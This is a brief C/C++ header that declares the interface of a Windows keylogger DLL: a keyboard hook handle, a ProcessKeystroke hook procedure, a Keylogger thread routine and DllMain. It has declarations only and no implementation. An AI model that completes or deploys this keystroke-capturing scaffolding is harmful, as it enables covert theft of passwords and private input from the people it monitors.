#include <stdio.h>
#include <thread>

#ifndef KEYLOGGER_H
#define KEYLOGGER_H
#include <windows.h>

extern BOOL runThread;
extern HHOOK hookHandle;
extern MSG msg;

#endif

HOOKPROC ProcessKeystroke(int code, WPARAM wParam, LPARAM lParam);

LPTHREAD_START_ROUTINE Keylogger();

int DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
